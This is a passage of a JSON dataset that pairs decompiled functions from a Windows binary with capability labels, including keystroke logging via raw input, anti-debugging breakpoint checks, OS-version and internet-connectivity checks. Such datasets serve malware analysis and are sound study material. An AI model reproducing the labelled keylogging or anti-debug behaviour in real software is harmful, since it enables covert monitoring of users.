        "decompiled_code": "\nbool __cdecl fcn.0041511a(uint *arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t in_ECX;\n    uint32_t uVar2;\n    uint var_20h;\n    uint var_1ch;\n    uint *var_18h;\n    int32_t *var_14h;\n    int32_t var_10h;\n    int32_t *var_ch;\n    int32_t *var_8h;\n    int32_t *var_4h;\n    \n    *arg_8h = *0x43c05c;\n    arg_8h[1] = *0x43c060;\n    arg_8h[2] = *0x43c064;\n    arg_8h[3] = *0x43c068;\n    var_ch = NULL;\n    iVar1 = (****(in_ECX + 0x4c))(*(in_ECX + 0x4c), 0x43c1bc, &var_ch);\n    if (-1 < iVar1) {\n        (**(*var_ch + 0x10))(var_ch, 1, arg_8h);\n        (**(*var_ch + 8))(var_ch);\n    }\n    var_14h = NULL;\n    iVar1 = fcn.00411a2f(arg_8h, 0x43c05c);\n    if ((iVar1 != 0) && (iVar1 = (****(in_ECX + 0x4c))(*(in_ECX + 0x4c), 0x43c1cc, &var_14h),  -1 < iVar1)) {\n        var_4h = NULL;\n        iVar1 = (**(*var_14h + 0xc))(var_14h, &var_4h);\n        if (-1 < iVar1) {\n            iVar1 = (**(*var_4h + 0xc))(var_4h, &var_10h);\n            if (-1 < iVar1) {\n                uVar2 = 0;\n                if (*(var_10h + 0x30) != 0) {\n                    do {\n                        iVar1 = (**(*var_4h + 0x24))(var_4h, uVar2, &var_1ch);\n                        if ((-1 < iVar1) && ((var_1ch & 7) == 3)) {\n                            var_8h = NULL;\n                            iVar1 = (**(*var_4h + 0x20))(var_4h, uVar2, &var_20h);\n                            if ((-1 < iVar1) && (iVar1 = (**(*var_4h + 0x38))(var_4h, var_20h, &var_8h),  -1 < iVar1)) {\n                                iVar1 = (**(*var_8h + 0xc))(var_8h, &var_18h);\n                                if (-1 < iVar1) {\n                                    *arg_8h = *var_18h;\n                                    arg_8h[1] = var_18h[1];\n                                    arg_8h[2] = var_18h[2];\n                                    arg_8h[3] = var_18h[3];\n                                    (**(*var_8h + 0x4c))(var_8h, var_18h);\n                                }\n                                (**(*var_8h + 8))(var_8h);\n                            }\n                            break;\n                        }\n                        uVar2 = uVar2 + 1;\n                    } while (uVar2 < *(var_10h + 0x30));\n                }\n                (**(*var_4h + 0x4c))(var_4h, var_10h);\n            }\n            (**(*var_4h + 8))(var_4h);\n        }\n        (**(*var_14h + 8))(var_14h);\n    }\n    iVar1 = fcn.00411a2f(arg_8h, 0x43c05c);\n    return iVar1 == 0;\n}\n",
        "token_count": 884
    },
    "00415439": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00415439(int32_t param_1)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    \n    piVar1 = *(param_1 + 0x24);\n    *(param_1 + 0x20) = 0;\n    if (piVar1 != NULL) {\n        if (piVar1[7] != 0) {\n            piVar1 = (**(*piVar1 + 0xf0))();\n            iVar2 = (*_sym.imp.USER32.dll_IsWindow)(*(*(param_1 + 0x24) + 0x1c));\n            if ((iVar2 != 0) && (*piVar1 != 0)) {\n                fcn.0042b3d6();\n            }\n            fcn.0042af2b();\n        }\n        *(*(param_1 + 0x24) + 0x4c) = 0;\n    }\n    return;\n}\n",
        "token_count": 210
    },
    "00415487": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __thiscall fcn.00415487(int32_t param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    \n    if ((*(param_1 + 0x24) != 0) &&\n       (iVar1 = (**(**(param_1 + 0x24) + 0xc))(*(param_1 + 0x28), 0xfffffffe, param_2, 0),  iVar1 != 0)) {\n        return 1;\n    }\n    uVar2 = (**(**(*(param_1 + 0x1c) + 0x1c) + 0xc))(*(param_1 + 0x28), 0xfffffffe, param_2, 0);\n    return uVar2;\n}\n",
        "token_count": 174
    },
    "00415ef2": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00415ef2(int32_t param_1)\n\n{\n    uint uVar1;\n    \n    if (*(param_1 + 0xc) == 0) {\n        return 0;\n    }\n    (**(**(param_1 + 0xc) + 0xb4))();\n    (**(**(*(param_1 + 0xc) + 0x8c) + 4))(param_1, 1);\n    // WARNING: Could not recover jumptable at 0x00415f27. Too many branches\n    // WARNING: Treating indirect jump as call\n    uVar1 = (****(*(param_1 + 0xc) + 0x8c))();\n    return uVar1;\n}\n",
        "token_count": 163
    },
    "00417031": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00417031(int32_t **param_1)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t **var_4h;\n    \n    if ((param_1[2] != 0x80010001) && (*param_1 != NULL)) {\n        puVar1 = (*param_1)[0x13];\n        var_4h = param_1;\n        iVar2 = (***puVar1)(puVar1, 0x43c00c, &var_4h);\n        if (iVar2 < 0) {\n            iVar2 = fcn.00415ef2();\n            if (iVar2 != 0) {\n                uVar3 = 0xd;\n                if (param_1[3][0x23] != 0) {\n                    uVar3 = 0x800d;\n                }\n                (**(**param_1 + 0x70))(*param_1, param_1[2], uVar3, iVar2);\n            }\n        }\n        else {\n            (*(*var_4h)[3])(var_4h, param_1[2], param_1[3] != NULL, param_1 + 4);\n            (*(*var_4h)[2])(var_4h);\n        }\n    }\n    return;\n}\n",
        "token_count": 297
    },
    "0041718e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0041718e(int32_t param_1)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    \n    uVar1 = *(*(param_1 + 8) + 4);\n    iVar2 = 0;\n    uVar3 = 0;\n    if (uVar1 != 0) {\n        do {\n            if ((*(**(param_1 + 8) + 4 + uVar3 * 8) != '\\0') && (iVar2 = fcn.00416068(uVar3),  iVar2 < 0)) {\n                return iVar2;\n            }\n            uVar3 = uVar3 + 1;\n        } while (uVar3 < uVar1);\n    }\n    return iVar2;\n}\n",
        "token_count": 181
    },
    "00417526": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nint32_t __cdecl fcn.00417526(uint *arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t *in_ECX;\n    uint unaff_ESI;\n    uint noname_2;\n    uint *noname_3;\n    int32_t *var_4h;\n    \n    var_4h = in_ECX;\n    fcn.00417188();\n    noname_3 = &var_4h;\n    noname_2 = 0x439f94;\n    iVar1 = (***arg_8h)();\n    if (-1 < iVar1) {\n        if (*in_ECX == 0) {\n            iVar1 = fcn.004149b3(1, arg_8h, noname_2, noname_3, unaff_ESI, var_4h);\n            if (iVar1 < 0) goto code_r0x00417578;\n            *(*in_ECX + 4) = 1;\n        }\n        iVar1 = fcn.00414a17(in_ECX[3], in_ECX[4], *in_ECX, in_ECX[6], var_4h);\n    }\ncode_r0x00417578:\n    fcn.004161bf();\n    return iVar1;\n}\n",
        "token_count": 294
    },
    "00417d40": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "log keystrokes via raw input data/18af53aa16f24c3fa3538f182ae5df5a"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00417d40(uint arg_8h)\n\n{\n    int32_t *piVar1;\n    int16_t iVar2;\n    int32_t iVar3;\n    int32_t in_ECX;\n    int32_t arg_ch;\n    int32_t iVar4;\n    uint32_t var_4h;\n    \n    iVar4 = 0;\n    var_4h = 0;\n    if (*(in_ECX + 0xc) != 0) {\n        do {\n            if ((*(in_ECX + 0x10) == 0) || (*(*(in_ECX + 0x10) + var_4h) != '\\x01')) {\n                iVar2 = *(iVar4 + 0x14 + *(in_ECX + 0x14));\n                if ((iVar2 == 0xd) || (iVar2 == 9)) {\n                    iVar3 = *(in_ECX + 0x14) + iVar4;\n                    if (*((*(iVar3 + 0x10) + 3 + *(iVar3 + 4) & 0xfffffffcU) + 4 + *(in_ECX + 8)) != 0)\n                    goto code_r0x00417e0d;\n                    iVar3 = *(in_ECX + 0x14) + iVar4;\n                    arg_ch = *(iVar3 + 4) + *(in_ECX + 8);\n                }\n                else {\n                    iVar3 = *(in_ECX + 0x14) + iVar4;\n                    arg_ch = *(iVar3 + 4) + *(in_ECX + 8);\n                }\n                fcn.00417c9b(*(iVar3 + 0x14), arg_ch, arg_8h);\n            }\n            else {\n                iVar3 = *(in_ECX + 0x14) + iVar4;\n                if (((*((*(iVar3 + 0x10) + 3 + *(iVar3 + 4) & 0xfffffffcU) + 4 + *(in_ECX + 8)) != 3) &&\n                    (piVar1 = *(iVar4 + 4 + *(in_ECX + 0x14)) + *(in_ECX + 8),  piVar1 != NULL)) && (*piVar1 != 0)) {\n                    (*_sym.imp.ole32.dll_CoTaskMemFree)(*piVar1);\n                    *piVar1 = 0;\n                }\n            }\ncode_r0x00417e0d:\n            var_4h = var_4h + 1;\n            iVar4 = iVar4 + 0x30;\n        } while (var_4h < *(in_ECX + 0xc));\n    }\n    return;\n}\n",
        "token_count": 588
    },
    "00418689": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00418689(int32_t *arg_8h, uint arg_ch, uint *arg_10h, uint32_t arg_14h)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint *puVar5;\n    int32_t *var_24h;\n    int32_t var_20h;\n    uint var_1ch;\n    uint32_t var_18h;\n    uint var_14h;\n    uint uStack20;\n    uint uStack16;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = *0x444220;\n    fcn.00417188();\n    var_20h = (***arg_8h)(arg_8h, 0x439f84, &var_24h);\n    uVar1 = arg_14h;\n    uVar2 = arg_14h;\n    puVar5 = arg_10h;\n    if (arg_14h != 0) {\n        for (; uVar2 != 0; uVar2 = uVar2 - 1) {\n            *puVar5 = 0;\n            puVar5 = puVar5 + 1;\n        }\n    }\n    if (-1 < var_20h) {\n        arg_14h = 0;\n        fcn.00417c3f();\n        var_1ch = arg_ch;\n        var_18h = uVar1;\n        var_14h = *0x43c820;\n        uStack20 = *0x43c824;\n        uStack16 = *0x43c828;\n        uStack12 = *0x43c82c;\n        var_20h = (**(*var_24h + 0xc))(var_24h, 1, &var_1ch, &arg_14h, &arg_8h);\n        if (-1 < var_20h) {\n            uVar2 = 0;\n            iVar4 = 0;\n            while( true ) {\n                uVar3 = arg_8h[1];\n                if (uVar1 <= arg_8h[1]) {\n                    uVar3 = uVar1;\n                }\n                if (uVar3 <= uVar2) break;\n                arg_10h[uVar2] = *(*arg_8h + 0x2c + iVar4);\n                uVar2 = uVar2 + 1;\n                iVar4 = iVar4 + 0x34;\n            }\n            if (*arg_8h != 0) {\n                (*_sym.imp.ole32.dll_CoTaskMemFree)(*arg_8h);\n            }\n        }\n        fcn.00417e26();\n    }\n    fcn.004161bf();\n    fcn.0041c6de();\n    return;\n}\n",
        "token_count": 630
    },
    "00418761": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_5ch\n// WARNING: Variable defined which should be unmapped: var_58h\n\nvoid fcn.00418761(void)\n\n{\n    uint8_t uVar1;\n    code **ppcVar2;\n    uint *puVar3;\n    int32_t iVar4;\n    uint uVar5;\n    int32_t *piVar6;\n    int32_t *extraout_ECX;\n    int32_t arg_2ch;\n    int32_t unaff_EBP;\n    uint unaff_ESI;\n    uint32_t arg_24h;\n    uint *puVar7;\n    uint unaff_EDI;\n    uint32_t uVar8;\n    int32_t iVar9;\n    int32_t iVar10;\n    uint *in_FS_OFFSET;\n    uint var_8h;\n    uint var_3ch;\n    uint var_24h;\n    uint var_14h;\n    uint var_10h;\n    uint uVar11;\n    uint var_5ch;\n    uint var_58h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_3dh;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h_2;\n    uint var_14h_2;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.0041c77c();\n    uVar11 = *0x444220;\n    *(unaff_EBP + -0x3c) = 0;\n    *(unaff_EBP + -0x24) = *0x43a0ec;\n    *(unaff_EBP + -0x20) = *0x43a0f0;\n    *(unaff_EBP + -0x1c) = *0x43a0f4;\n    *(unaff_EBP + -0x14) = uVar11;\n    *(unaff_EBP + -0x10) = &var_5ch;\n    *(unaff_EBP + -0x48) = extraout_ECX;\n    *(unaff_EBP + -0x18) = *0x43a0f8;\n    *(unaff_EBP + -0x3d) = 0;\n    ppcVar2 = **(unaff_EBP + 8);\n    *(unaff_EBP + -4) = 0;\n    iVar10 = unaff_EBP + -0x3c;\n    uVar11 = 0x439f94;\n    var_5ch = unaff_EDI;\n    var_58h = unaff_ESI;\n    iVar4 = (**ppcVar2)(*(unaff_EBP + 8));\n    if (-1 < iVar4) {\n        iVar4 = extraout_ECX[5];\n        *(unaff_EBP + -0x2c) = 0;\n        if (iVar4 == 0) {\n            *(unaff_EBP + -0x28) = 0;\n            ppcVar2 = **(unaff_EBP + 8);\n            *(unaff_EBP + -4) = 1;\n            iVar4 = (**ppcVar2)(*(unaff_EBP + 8), 0x439f74, unaff_EBP + -0x28);\n            *(unaff_EBP + -0x38) = iVar4;\n            piVar6 = *(unaff_EBP + -0x28);\n            if (iVar4 < 0) {\n                *(unaff_EBP + -4) = 0;\n                if (piVar6 != NULL) {\n                    (**(*piVar6 + 8))(piVar6);\n                }\n                piVar6 = *(unaff_EBP + -0x3c);\n                *(unaff_EBP + -4) = 0xffffffff;\n                goto code_r0x00418c36;\n            }\n            iVar4 = (**(*piVar6 + 0xc))(piVar6, extraout_ECX + 3, extraout_ECX + 5, extraout_ECX + 6);\n            piVar6 = *(unaff_EBP + -0x28);\n            *(unaff_EBP + -4) = 0;\n            if (iVar4 < 0) {\n                if (piVar6 != NULL) {\n                    (**(*piVar6 + 8))(piVar6);\n                }\n                goto code_r0x00418d05;\n            }\n            *(extraout_ECX + 7) = 0;\n            if (piVar6 != NULL) {\n                (**(*piVar6 + 8))(piVar6);\n            }\n        }\n        else {\n            *(extraout_ECX + 7) = 1;\n        }\n        iVar4 = extraout_ECX[3];\n        *(unaff_EBP + -0x34) = 0;\n        *(unaff_EBP + -4) = 2;\n        uVar5 = fcn.00428fb1(iVar4 * 0x34);\n        *(unaff_EBP + -0x34) = uVar5;\n        *(unaff_EBP + -4) = 0;\n        if (*(unaff_EBP + -0x34) != 0) {\n            iVar4 = extraout_ECX[3];\n            *(unaff_EBP + -4) = 4;\n            iVar4 = fcn.00428fb1(iVar4);\n            extraout_ECX[4] = iVar4;\n            uVar8 = 0;\n            iVar4 = extraout_ECX[4];\n            *(unaff_EBP + -4) = 0;\n            if (iVar4 != 0) {\n                *(unaff_EBP + -0x30) = *(unaff_EBP + -0x34);\n                *(unaff_EBP + -0x38) = 0;\ncode_r0x004188d0:\n                if (extraout_ECX[3] <= uVar8) goto code_r0x00418be4;\n                *(uVar8 + extraout_ECX[4]) = 0;\n                iVar9 = uVar8 * 0x30;\n                iVar4 = extraout_ECX[5] + iVar9;\n                if ((extraout_ECX[9] <= *(iVar4 + 0x10) && *(iVar4 + 0x10) != extraout_ECX[9]) &&\n                   (*(iVar4 + 0x14) != 0xd)) {\n                    if (extraout_ECX[8] == 2) {\n                        uVar8 = *(unaff_EBP + -0x2c) + 3U & 0xfffffffc;\n                        *(unaff_EBP + -0x28) = uVar8 + 4;\n                        *(unaff_EBP + -0x2c) = uVar8 + 8;\n                        arg_24h = 0;\n                        fcn.00414b41(*(unaff_EBP + -0x30), *(iVar4 + 8), *(iVar4 + 0x14), *(iVar4 + 0x10), \n                                     *(iVar4 + 0x16), *(iVar4 + 0x17), 0, 0, uVar8, *(unaff_EBP + -0x28), 0, 0, 1);\n                    }\n                    else {\n                        if (extraout_ECX[8] != 1) {\n                            if (*(unaff_EBP + -0x3d) == '\\0') {\n                                *(unaff_EBP + -0x5c) = 0x89;\n                                *(unaff_EBP + -0x58) = 0x8b;\n                                *(unaff_EBP + -0x50) = 0;\n                                *(unaff_EBP + -0x4c) = 0;\n                                fcn.00418689(*(unaff_EBP + 8), unaff_EBP + -0x5c, unaff_EBP + -0x50, 2);\n                                if (*(unaff_EBP + -0x50) == 0) {\n                                    if (*(unaff_EBP + -0x4c) != 0) {\n                                        puVar7 = 0x43a0dc;\n                                        goto code_r0x00418a2f;\n                                    }\n                                }\n                                else {\n                                    puVar7 = 0x43a0ec;\ncode_r0x00418a2f:\n                                    *(unaff_EBP + -0x24) = *puVar7;\n                                    *(unaff_EBP + -0x20) = puVar7[1];\n                                    *(unaff_EBP + -0x1c) = puVar7[2];\n                                    *(unaff_EBP + -0x18) = puVar7[3];\n                                }\n                                *(unaff_EBP + -0x3d) = 1;\n                            }\n                            *(unaff_EBP + -0x44) = 0;\n                            *(unaff_EBP + -4) = 6;\n                            uVar5 = fcn.00428fb1(0x14);\n                            *(unaff_EBP + -0x44) = uVar5;\n                            *(unaff_EBP + -4) = 0;\n                            if (*(unaff_EBP + -0x44) != 0) {\n                                puVar7 = unaff_EBP + -0x24;\n                                goto code_r0x00418b05;\n                            }\n                            iVar10 = *(unaff_EBP + -0x38);\n                            if (iVar10 != 0) {\n                                puVar7 = *(unaff_EBP + -0x34) + 0x14;\n                                do {\n                                    fcn.00428fdc(*puVar7);\n                                    puVar7 = puVar7 + 0xd;\n                                    iVar10 = iVar10 + -1;\n                                } while (iVar10 != 0);\n                            }\n                            goto code_r0x00418ae5;\n                        }\n                        *(iVar4 + 0x15) = *(iVar4 + 0x15) | 0x40;\n                        iVar4 = *(unaff_EBP + -0x38);\n                        *(extraout_ECX[5] + 0x10 + iVar9) = 4;\n                        *(iVar4 + extraout_ECX[4]) = 1;\n                        iVar4 = extraout_ECX[5];\n                        *(unaff_EBP + -0x28) = iVar4 + iVar9;\n                        iVar4 = fcn.00414c12(*(iVar4 + iVar9 + 0x14));\n                        arg_24h = iVar4 + -1 + *(unaff_EBP + -0x2c) & ~(iVar4 - 1U);\n                        iVar4 = *(unaff_EBP + -0x28);\n                        uVar8 = *(iVar4 + 0x10) + 3 + arg_24h & 0xfffffffc;\n                        *(unaff_EBP + -0x28) = uVar8 + 4;\n                        *(unaff_EBP + -0x2c) = uVar8 + 8;\n                        fcn.00414b41(*(unaff_EBP + -0x30), *(iVar4 + 8), *(iVar4 + 0x14), *(iVar4 + 0x10), \n                                     *(iVar4 + 0x16), *(iVar4 + 0x17), 0, arg_24h, uVar8, *(unaff_EBP + -0x28), 0, 0, 0)\n                        ;\n                    }\n                    goto code_r0x00418bce;\n                }\n                if (*(iVar4 + 0x14) == 0xd) {\n                    *(unaff_EBP + -0x44) = 0;\n                    *(unaff_EBP + -4) = 8;\n                    uVar5 = fcn.00428fb1(0x14);\n                    *(unaff_EBP + -0x44) = uVar5;\n                    *(unaff_EBP + -4) = 0;\n                    if (*(unaff_EBP + -0x44) == 0) {\n                        iVar10 = *(unaff_EBP + -0x38);\n                        if (iVar10 != 0) {\n                            puVar7 = *(unaff_EBP + -0x34) + 0x14;\n                            do {\n                                fcn.00428fdc(*puVar7);\n                                puVar7 = puVar7 + 0xd;\n                                iVar10 = iVar10 + -1;\n                            } while (iVar10 != 0);\n                        }\ncode_r0x00418ae5:\n                        fcn.00428fdc(*(unaff_EBP + -0x34));\n                        fcn.00428fdc(extraout_ECX[4]);\n                        extraout_ECX[4] = 0;\n                        goto code_r0x0041887f;\n                    }\n                    puVar7 = 0x43a0cc;\ncode_r0x00418b05:\n                    puVar3 = *(unaff_EBP + -0x44);\n                    *puVar3 = 0;\n                    puVar3[1] = *puVar7;\n                    puVar3[2] = puVar7[1];\n                    puVar3[3] = puVar7[2];\n                    puVar3[4] = puVar7[3];\n                    iVar9 = *(unaff_EBP + -0x38) * 0x30;\n                    *(extraout_ECX[5] + 0x14 + iVar9) = 0xd;\n                    *(extraout_ECX[5] + 0x10 + iVar9) = 4;\n                    iVar4 = extraout_ECX[5];\n                    *(unaff_EBP + -0x28) = iVar4 + iVar9;\n                    iVar4 = fcn.00414c12(*(iVar4 + iVar9 + 0x14));\n                    uVar5 = *(unaff_EBP + -0x44);\n                }\n                else {\n                    if (*(iVar4 + 0x14) == 0x81) {\n                        *(iVar4 + 0x10) = *(iVar4 + 0x10) + 1;\n                    }\n                    iVar4 = extraout_ECX[5] + iVar9;\n                    if (*(iVar4 + 0x14) == 0x82) {\n                        *(iVar4 + 0x10) = *(iVar4 + 0x10) * 2 + 2;\n                    }\n                    iVar4 = extraout_ECX[5];\n                    *(unaff_EBP + -0x28) = iVar4 + iVar9;\n                    iVar4 = fcn.00414c12(*(iVar4 + iVar9 + 0x14));\n                    uVar5 = 0;\n                }\n                arg_24h = iVar4 + -1 + *(unaff_EBP + -0x2c) & ~(iVar4 - 1U);\n                iVar4 = *(unaff_EBP + -0x28);\n                uVar8 = *(iVar4 + 0x10) + 3 + arg_24h & 0xfffffffc;\n                arg_2ch = uVar8 + 4;\n                uVar1 = *(iVar4 + 0x17);\n                *(unaff_EBP + -0x2c) = arg_2ch;\n                *(unaff_EBP + -0x2c) = *(unaff_EBP + -0x2c) + 4;\n                *(unaff_EBP + -0x28) = arg_2ch;\n                fcn.00414a61(*(unaff_EBP + -0x30), *(iVar4 + 8), *(iVar4 + 0x14), *(iVar4 + 0x10), *(iVar4 + 0x16), \n                             uVar1, 0, arg_24h, uVar8, arg_2ch, uVar5);\ncode_r0x00418bce:\n                *(unaff_EBP + -0x30) = *(unaff_EBP + -0x30) + 0x34;\n                iVar4 = extraout_ECX[5];\n                *(unaff_EBP + -0x38) = *(unaff_EBP + -0x38) + 1;\n                *(iVar4 + 4 + iVar9) = arg_24h;\n                uVar8 = *(unaff_EBP + -0x38);\n                goto code_r0x004188d0;\n            }\n            fcn.00428fdc(*(unaff_EBP + -0x34));\n            goto code_r0x00418cb1;\n        }\ncode_r0x0041887f:\n        piVar6 = *(unaff_EBP + -0x3c);\n        *(unaff_EBP + -4) = 0xffffffff;\n        goto code_r0x00418cbb;\n    }\n    piVar6 = *(unaff_EBP + -0x3c);\n    *(unaff_EBP + -4) = 0xffffffff;\n    goto code_r0x00418d0e;\ncode_r0x00418be4:\n    if (*extraout_ECX == 0) {\n        iVar10 = fcn.004149b3(1, 1, uVar11, iVar10, var_5ch, var_58h);\n        *(unaff_EBP + -0x38) = iVar10;\n        if (iVar10 < 0) {\n            uVar8 = 0;\n            if (extraout_ECX[3] != 0) {\n                puVar7 = *(unaff_EBP + -0x34) + 0x14;\n                do {\n                    fcn.00428fdc(*puVar7);\n                    uVar8 = uVar8 + 1;\n                    puVar7 = puVar7 + 0xd;\n                } while (uVar8 < extraout_ECX[3]);\n            }\n            fcn.00428fdc(*(unaff_EBP + -0x34));\n            fcn.00428fdc(extraout_ECX[4]);\n            piVar6 = *(unaff_EBP + -0x3c);\n            extraout_ECX[4] = 0;\n            *(unaff_EBP + -4) = 0xffffffff;\ncode_r0x00418c36:\n            if (piVar6 != NULL) {\n                (**(*piVar6 + 8))(piVar6);\n            }\n            goto code_r0x00418d18;\n        }\n        *(*extraout_ECX + 4) = 1;\n    }\n    uVar11 = *(unaff_EBP + -0x2c);\n    extraout_ECX[2] = 0;\n    *(unaff_EBP + -4) = 10;\n    iVar10 = fcn.00428fb1(uVar11);\n    extraout_ECX[2] = iVar10;\n    iVar10 = extraout_ECX[2];\n    uVar8 = 0;\n    *(unaff_EBP + -4) = 0;\n    if (iVar10 == 0) {\n        if (extraout_ECX[3] != 0) {\n            puVar7 = *(unaff_EBP + -0x34) + 0x14;\n            do {\n                fcn.00428fdc(*puVar7);\n                uVar8 = uVar8 + 1;\n                puVar7 = puVar7 + 0xd;\n            } while (uVar8 < extraout_ECX[3]);\n        }\n        fcn.00428fdc(*(unaff_EBP + -0x34));\n        fcn.00428fdc(extraout_ECX[4]);\n        extraout_ECX[4] = 0;\ncode_r0x00418cb1:\n        piVar6 = *(unaff_EBP + -0x3c);\n        *(unaff_EBP + -4) = 0xffffffff;\ncode_r0x00418cbb:\n        if (piVar6 != NULL) {\n            (**(*piVar6 + 8))(piVar6);\n        }\n        goto code_r0x00418d18;\n    }\n    fcn.0041cc60(iVar10, 0, *(unaff_EBP + -0x2c));\n    iVar10 = fcn.00414a17(*(unaff_EBP + -0x34), extraout_ECX[3], *extraout_ECX, *(unaff_EBP + -0x2c), \n                          *(unaff_EBP + -0x3c));\n    if (iVar10 < 0) {\n        fcn.00428fdc(extraout_ECX[4]);\n        extraout_ECX[4] = 0;\n    }\n    fcn.00428fdc(*(unaff_EBP + -0x34));\ncode_r0x00418d05:\n    piVar6 = *(unaff_EBP + -0x3c);\n    *(unaff_EBP + -4) = 0xffffffff;\ncode_r0x00418d0e:\n    if (piVar6 != NULL) {\n        (**(*piVar6 + 8))(piVar6);\n    }\ncode_r0x00418d18:\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    fcn.0041c6de();\n    return;\n}\n",
        "token_count": 4678
    },
    "00419112": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00419112(int32_t **param_1)\n\n{\n    int32_t *piVar1;\n    \n    if (param_1[4] != NULL) {\n        if (*param_1 != NULL) {\n            fcn.0041866e(*param_1);\n        }\n        piVar1 = param_1[4];\n        if (piVar1 != NULL) {\n            fcn.00417c96();\n            fcn.00428fdc(piVar1);\n        }\n        param_1[4] = NULL;\n    }\n    if (*param_1 != NULL) {\n        fcn.00416048();\n        piVar1 = *param_1;\n        if (piVar1 != NULL) {\n            *param_1 = NULL;\n            (**(*piVar1 + 8))(piVar1);\n        }\n        piVar1 = param_1[1];\n        if (piVar1 != NULL) {\n            param_1[1] = NULL;\n            (**(*piVar1 + 8))(piVar1);\n        }\n    }\n    return;\n}\n",
        "token_count": 237
    },
    "0041987f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_13ch\n// WARNING: Variable defined which should be unmapped: var_130h\n\nvoid __cdecl fcn.0041987f(uint arg_8h, uint arg_ch)\n\n{\n    char *pcVar1;\n    uchar uVar2;\n    uint16_t uVar3;\n    uint uVar4;\n    double dVar5;\n    code *pcVar6;\n    char cVar7;\n    ulong *puVar8;\n    uint *puVar9;\n    uint uVar10;\n    int16_t *piVar11;\n    uchar *puVar12;\n    int32_t iVar13;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_13ch;\n    uint var_130h;\n    uint var_120h;\n    uint var_110h;\n    uint var_100h;\n    uint var_f0h;\n    uint var_e0h;\n    uint var_d0h;\n    uint var_c0h;\n    uint var_b0h;\n    uint var_a0h;\n    uint var_90h;\n    uint var_80h;\n    uint var_70h;\n    uint var_60h;\n    uint var_58h;\n    uint var_50h;\n    uint var_48h;\n    uint var_44h;\n    uint pvargDest;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_18h;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.0041c77c();\n    *(unaff_EBP + -0x10) = *0x444220;\n    *(unaff_EBP + -0x30) = 0;\n    fcn.00413378(unaff_EBP + -0x40);\n    *(unaff_EBP + -4) = 0;\n    fcn.004174cd(*(unaff_EBP + 0xc), unaff_EBP + -0x28);\n    if ((*(unaff_EBP + -0x28) == 3) ||\n       (cVar7 = 